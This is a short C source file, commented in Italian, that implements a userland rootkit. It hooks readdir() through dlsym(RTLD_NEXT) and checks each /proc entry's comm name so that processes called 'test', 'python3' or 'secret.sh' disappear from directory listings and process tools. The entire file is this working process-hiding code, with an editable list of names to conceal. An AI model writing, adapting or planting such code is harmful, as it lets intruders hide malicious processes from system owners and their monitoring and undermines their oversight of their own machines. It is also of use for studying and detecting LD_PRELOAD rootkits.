#include <stdio.h>
#include <errno.h>
#include <dirent.h>
#include <error.h>
#define __USE_GNU
#include <dlfcn.h>
#include <string.h>
#include <sys/stat.h>

#define NUM_NAMES 3
const char *HIDE_NAMES[NUM_NAMES] = {"test", "python3", "secret.sh"};  // Aggiungi qui i nomi dei processi da nascondere

static struct dirent *(*old_readdir) (DIR *) = NULL;

int should_hide_process(const char *process_name) {
    for (int i = 0; i < NUM_NAMES; i++) {
        if (strcmp(process_name, HIDE_NAMES[i]) == 0) {
            return 1;  // Il processo deve essere nascosto
        }
    }
    return 0;  // Il processo non deve essere nascosto
}

struct dirent *readdir(DIR *dirp) {
    if (old_readdir == NULL) {
        old_readdir = dlsym(RTLD_NEXT, "readdir");
        if (old_readdir == NULL) {
            error(1, errno, "dlsym");
        }

        fprintf(stderr, "Catched\n");
    }

    struct dirent *direntp;
    while ((direntp = old_readdir(dirp)) != NULL) {
        if (direntp->d_type == DT_DIR) {
            char proc[300], name[80];
            FILE *comm;

            snprintf(proc, sizeof(proc), "/proc/%s/comm", direntp->d_name);
            comm = fopen(proc, "r");
            if (comm == NULL) continue;

            if (fgets(name, sizeof(name), comm) != NULL) {
                name[strcspn(name, "\n")] = 0;
                
                if (should_hide_process(name)) {
                    fclose(comm);
                    continue;  // Nascondi il processo
                }
            }
            fclose(comm);
        }
        break;
    }
    return direntp;
}
